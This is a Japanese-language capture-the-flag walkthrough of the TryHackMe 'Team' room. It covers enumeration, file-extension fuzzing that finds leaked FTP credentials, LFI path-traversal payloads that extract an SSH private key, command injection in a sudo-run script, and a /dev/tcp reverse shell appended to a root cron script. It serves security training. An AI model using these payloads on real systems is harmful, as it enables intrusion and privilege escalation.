# Team CTF

https://tryhackme.com/room/teamcw

```text
Hey all this is my first box! It is aimed at beginners as I often see boxes that are "easy" but are often a bit harder!
```

・・・こんなことを書いていたが、ぜんぜん簡単ではなかった。

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.21.203
root@ip-10-10-132-134:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-14 23:28 GMT
Nmap scan report for 10.10.21.203
Host is up (0.00045s latency).
Not shown: 65532 filtered ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:96:69:21:60:B5 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 104.38 seconds
root@ip-10-10-132-134:~# sudo nmap -sV -p21,22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-14 23:30 GMT
Nmap scan report for 10.10.21.203
Host is up (0.00015s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:96:69:21:60:B5 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

ホームページはApacheインストールページ。  
FTPはAnonymousログイン不可。

### gobuster

```shell
root@ip-10-10-132-134:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.21.203
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

hosts に team.thm を追加したらApacheではないページが表示された。

```shell
root@ip-10-10-132-134:~# gobuster dir -x=txt,php -u http://team.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://team.thm
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 305] [--> http://team.thm/images/]
/.php                 (Status: 403) [Size: 273]
/assets               (Status: 301) [Size: 305] [--> http://team.thm/assets/]
/robots.txt           (Status: 200) [Size: 5]
/server-status        (Status: 403) [Size: 273]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

robots.txt

```text
dale
```

CTFの作成者がdalezzaであることを考えると、ユーザー名と思われる。  
FTPとSSHで軽くブルートフォースを試したが無駄だった。

burpで見ると scripts ディレクトリがあるのに、gobuster の結果には出ていない。  
directory-list-2.3-medium.txt に script というワードが入っていないことに初めて気づいた。

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt
```

```shell
root@ip-10-10-132-134:~# gobuster dir -x=txt,php,js -u http://team.thm/scripts -w ./dirlist.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://team.thm/scripts
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                ./dirlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 273]
/.htaccess            (Status: 403) [Size: 273]
/.htaccess.txt        (Status: 403) [Size: 273]
/.htaccess.js         (Status: 403) [Size: 273]
/.htaccess.php        (Status: 403) [Size: 273]
/.htpasswd            (Status: 403) [Size: 273]
/.htpasswd.txt        (Status: 403) [Size: 273]
/.htpasswd.js         (Status: 403) [Size: 273]
/.htpasswd.php        (Status: 403) [Size: 273]
/script.txt           (Status: 200) [Size: 597]
Progress: 908760 / 908764 (100.00%)
===============================================================
Finished
===============================================================
```

/scripts/script.txt

```shell
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```

http://team.thm/scripts/script.sh  
http://team.thm/scripts/script.sh~  
http://team.thm/scripts/script.txt~  

等があるかと予想したが、存在しなかった。

ffuf を使う。

https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/file-extensions.txt

```shell
$ ffuf -w ./file-extensions.txt -X GET -u http://team.thm/scripts/script.FUZZ -fc 404
```

.txt しかヒットせず。

https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/file-extensions-all-cases.txt

```shell
ffuf -w ./file-extensions-all-cases.txt -X GET -u http://team.thm/scripts/script.FUZZ -fc 404

ffuf -w ./file-extensions-all-cases.txt -X GET -u http://team.thm/scripts/script.FUZZ~ -fc 404
```

.txt しかヒットせず。

アルファベット１～３桁のブルートフォースリストを作る。

```shell
$ echo {a..z} {a..z}{a..z} {a..z}{a..z}{a..z} | tr ' ' '\n' > combinations.txt
$ ffuf -w ./combinations.txt -X GET -u http://team.thm/scripts/script.FUZZ -fc 404

old                     [Status: 200, Size: 466, Words: 27, Lines: 19, Duration: 384ms]
txt                     [Status: 200, Size: 597, Words: 52, Lines: 22, Duration: 362ms]
```

old と判明。

script.old

```shell
#!/bin/bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit
```

## FTP

```shell
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls -al
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    5 65534    65534        4096 Jan 15  2021 .
drwxr-xr-x    5 65534    65534        4096 Jan 15  2021 ..
-rw-r--r--    1 1002     1002          220 Apr 04  2018 .bash_logout
-rw-r--r--    1 1002     1002         3771 Apr 04  2018 .bashrc
drwxrwxr-x    3 1002     1002         4096 Jan 15  2021 .local
-rw-r--r--    1 1002     1002          807 Apr 04  2018 .profile
drwx------    2 1002     1002         4096 Jan 15  2021 .ssh
drwxrwxr-x    2 65534    65534        4096 Jan 15  2021 workshare
226 Directory send OK.
```

```shell
$ cat known_hosts                                                                           
|1|lzgG+5zzzbENxEXceLc922zRWDg=|fx7l2fmESZ9VBzXebFzfAlM451M= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBcvf0EqbWNp1pqXNP47piGmO64E1teH6vV4u5utrwpXE/9KereXvPL2AYcfzhrA/RO+PEjp9oh++xknJPp/VF0=
                                                                                                                    
$ cat ./New_site.txt 
Dale
        I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles
```

hosts を dev.team.thm に変更する。

## dev.team.thm

```shell
root@ip-10-10-169-227:~# gobuster dir -x=txt,php -u http://dev.team.thm/ -w ./dirlist.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.team.thm/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                ./dirlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 187]
/script.php           (Status: 200) [Size: 114]
/server-status        (Status: 403) [Size: 277]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

ホームページのリンクをクリックすると下記がリクエストされる。

http://dev.team.thm/script.php?page=teamshare.php

include で page を表示していると想定。

http://dev.team.thm/script.php?page=../../../../etc/passwd  
または  
http://dev.team.thm/script.php?page=php://filter/convert.base64-encode/resource=/etc/passwd  
の形でファイルインクルージョンが機能することを確認。

dataスキームは機能しない。

http://dev.team.thm/script.php?page=../../../../var/log/apache2/access.log  
表示されない。

http://dev.team.thm/script.php?page=../../../../home/dale/.ssh/id_rsa  
表示されない。

LFI-gracefulsecurity-linux.txt で ffuf を実行すると大量にヒットしすぎて訳が分からないので、SSHに絞る。

```shell
$ grep ssh /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/id_ecdsa
~/.ssh/id_ecdsa.pub
~/.ssh/identity
~/.ssh/identity.pub
```

http://dev.team.thm/script.php?page=../../../../etc/ssh/sshd_config

をみると、dale のプライベートキーが入っていることが分かった。

Base64にして取得。  
http://dev.team.thm/script.php?page=php://filter/convert.base64-encode/resource=../../../../etc/ssh/sshd_config


デコードし、下記の部分を id_rsa_dale として保存。  
各行の # は削除した。 
```text
#-----BEGIN OPENSSH PRIVATE KEY-----
..........................
#-----END OPENSSH PRIVATE KEY-----
```

```shell
$ ssh dale@10.10.62.228 -i ./id_rsa_dale
Last login: Mon Jan 18 10:51:32 2021
dale@TEAM:~$ 
```

daleで接続成功。

```shell
dale@TEAM:~$ cat user.txt
THM{..........}
```

ユーザーフラグゲット。

## 権限昇格１

sudo 
```shell
dale@TEAM:~$ sudo -l
Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

gyles として /home/gyles/admin_checks を実行可能。

```shell
dale@TEAM:~$ ls -al /home/gyles/admin_checks
-rwxr--r-- 1 gyles editors 399 Jan 15  2021 /home/gyles/admin_checks

dale@TEAM:~$ cat /home/gyles/admin_checks
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

cp が相対パスだが、env_reset設定なのでPATHのexportは効果がない。

/var/stats/stats.txt をシンボリックリンクにして、.bash_history をコピーさせればよいと考えた。

```shell
dale@TEAM:/var/stats$ rm ./stats.txt

dale@TEAM:/var/stats$ ln -s /home/gyles/.bash_history ./stats.txt

dale@TEAM:/var/stats$ sudo  --user=gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: aaa
Enter 'date' to timestamp the file: bbb
The Date is Stats have been backed up

dale@TEAM:/var/stats$ ls -al
total 24
drwxrwxrwx  2 root  root  4096 Mar 15 03:45 .
drwxr-xr-x 15 root  root  4096 Jan 15  2021 ..
-rw-------  1 gyles gyles 5643 Mar 15 03:45 stats-2025-03-15-03-45.bak

dale@TEAM:/var/stats$ cat stats-2025-03-15-03-45.bak
cat: stats-2025-03-15-03-45.bak: Permission denied
```

パーミッションがそのままコピーされたため失敗。

```text
$error 2>/dev/null
```

この部分はコマンドインジェクションが効くかもしれない。

```shell
dale@TEAM:/var/stats$ sudo  --user=gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: aaa
Enter 'date' to timestamp the file: bash
The Date is whoami
gyles
```

gylesに昇格成功。

## 権限昇格２

adminグループのファイル

```shell
id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)

find / -group admin -type f 2>/dev/null
/usr/local/bin/main_backup.sh
```

```shell
ls -al /usr/local/bin/main_backup.sh
-rwxrwxr-x 1 root admin 65 Jan 17  2021 /usr/local/bin/main_backup.sh

cat /usr/local/bin/main_backup.sh
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
```

スクリプトの変更は可能。

```shell
ls -al /var/backups/www/team.thm/
total 28
drwxr-xr-x 5 root root 4096 Jan 17  2021 .
drwxr-xr-x 4 root root 4096 Jan 17  2021 ..
drwxr-xr-x 5 root root 4096 Jan 16  2021 assets
drwxr-xr-x 4 root root 4096 Jan 16  2021 images
-rwxr--r-- 1 root root 2966 Mar 15 04:17 index.html
-rw-r--r-- 1 root root    5 Mar 15 04:17 robots.txt
drwxr-xr-x 2 root root 4096 Jan 16  2021 scripts
```

タイプスタンプを見ると、毎分 root によって実行されている。

リバースシェルを追加。

```shell
echo 'sh -i >& /dev/tcp/10.2.22.182/8888 0>&1' >> /usr/local/bin/main_backup.sh
cat /usr/local/bin/main_backup.sh
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
sh -i >& /dev/tcp/10.2.22.182/8888 0>&1
```

ルートシェル取得。

```shell
$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.62.228] 38422
sh: 0: can't access tty; job control turned off
# whoami
root
# 
```

```shell
# cat /root/root.txt
THM{..........}
```

ルートフラグゲット！

## 振り返り

- 全然簡単ではなく、かなり難しく感じた。
- ドメイン名が（CTFのタイトル以外で）示唆されていないのに推測して hosts 変更が必要なパターンは初めて。
- ドメイン名を途中で変更するパターンも初めて。
- directory-list-2.3-medium.txt に、script という超基本的なワードが含まれていないことに初めて気づいた。今後は他のリストとマージして使うことにする。
- 拡張子oldを発見するのも、sshd_config を発見するのも難しかった。
